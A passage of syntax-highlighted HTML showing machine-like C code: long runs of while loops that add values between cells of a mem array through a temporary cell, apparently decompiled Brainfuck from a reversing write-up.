class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">5</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">12</span>])&#123;</span><br><span class="line">        mem[<span class="number">12</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">18</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">12</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">6</span>])&#123;</span><br><span class="line">        mem[<span class="number">6</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">18</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">6</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">13</span>])&#123;</span><br><span class="line">        mem[<span class="number">13</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">19</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">13</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">1</span>])&#123;</span><br><span class="line">        mem[<span class="number">1</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">19</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">1</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">14</span>])&#123;</span><br><span class="line">        mem[<span class="number">14</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">20</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">14</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">2</span>])&#123;</span><br><span class="line">        mem[<span class="number">2</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">20</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">2</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">15</span>])&#123;</span><br><span class="line">        mem[<span class="number">15</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">21</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">15</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">3</span>])&#123;</span><br><span class="line">        mem[<span class="number">3</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">21</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">3</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">16</span>])&#123;</span><br><span class="line">        mem[<span class="number">16</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">22</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">16</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">4</span>])&#123;</span><br><span class="line">        mem[<span class="number">4</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">22</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">4</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">17</span>])&#123;</span><br><span class="line">        mem[<span class="number">17</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">23</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">17</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">5</span>])&#123;</span><br><span class="line">        mem[<span class="number">5</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">23</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">5</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">18</span>])&#123;</span><br><span class="line">        mem[<span class="number">18</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">24</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">18</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">6</span>])&#123;</span><br><span class="line">        mem[<span class="number">6</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">24</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">6</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">19</span>])&#123;</span><br><span class="line">        mem[<span class="number">19</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">25</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">19</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">1</span>])&#123;</span><br><span class="line">        mem[<span class="number">1</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">25</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">1</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">20</span>])&#123;</span><br><span class="line">        mem[<span class="number">20</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">26</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">20</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">2</span>])&#123;</span><br><span class="line">        mem[<span class="number">2</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">26</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">2</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">21</span>])&#123;</span><br><span class="line">        mem[<span class="number">21</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">27</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">21</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">3</span>])&#123;</span><br><span class="line">        mem[<span class="number">3</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">27</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">3</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">22</span>])&#123;</span><br><span class="line">        mem[<span class="number">22</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">28</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">22</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">4</span>])&#123;</span><br><span class="line">        mem[<span class="number">4</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">28</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">4</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">23</span>])&#123;</span><br><span class="line">        mem[<span class="number">23</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">29</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">23</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">5</span>])&#123;</span><br><span class="line">        mem[<span class="number">5</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">29</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">5</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">24</span>])&#123;</span><br><span class="line">        mem[<span class="number">24</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">30</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">24</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">6</span>])&#123;</span><br><span class="line">        mem[<span class="number">6</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">30</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">6</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">2</span>])&#123;</span><br><span class="line">        mem[<span class="number">2</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">31</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">2</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">9</span>])&#123;</span><br><span class="line">        mem[<span class="number">9</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">31</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">9</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">16</span>])&#123;</span><br><span class="line">        mem[<span class="number">16</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">31</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">16</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">23</span>])&#123;</span><br><span class="line">        mem[<span class="number">23</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">31</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">23</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">30</span>])&#123;</span><br><span class="line">        mem[<span class="number">30</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">31</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">30</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">25</span>])&#123;</span><br><span class="line">        mem[<span class="number">25</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">32</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">25</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">20</span>])&#123;</span><br><span class="line">        mem[<span class="number">20</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">32</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">20</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">15</span>])&#123;</span><br><span class="line">        mem[<span class="number">15</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">32</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">15</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">10</span>])&#123;</span><br><span class="line">        mem[<span class="number">10</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">32</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">10</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">5</span>])&#123;</span><br><span class="line">        mem[<span class="number">5</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">32</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">5</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">13</span>])&#123;</span><br><span class="line">        mem[<span class="number">13</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">33</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">13</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">8</span>])&#123;</span><br><span class="line">        mem[<span class="number">8</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">33</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">8</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">3</span>])&#123;</span><br><span class="line">        mem[<span class="number">3</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">33</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">3</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">22</span>])&#123;</span><br><span class="line">        mem[<span class="number">22</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">33</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">22</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">30</span>])&#123;</span><br><span class="line">        mem[<span class="number">30</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">33</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">30</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">7</span>])&#123;</span><br><span class="line">        mem[<span class="number">7</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">34</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">7</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">2</span>])&#123;</span><br><span class="line">        mem[<span class="number">2</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">34</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">2</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">21</span>])&#123;</span><br><span class="line">        mem[<span class="number">21</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">34</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">21</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">28</span>])&#123;</span><br><span class="line">        mem[<span class="number">28</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">34</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">28</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">17</span>])&#123;</span><br><span class="line">        mem[<span class="number">17</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">34</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">17</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">8</span>])&#123;</span><br><span class="line">        mem[<span class="number">8</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">35</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">8</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">15</span>])&#123;</span><br><span class="line">        mem[<span class="number">15</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">35</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">15</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">22</span>])&#123;</span><br><span class="line">        mem[<span class="number">22</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">35</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span 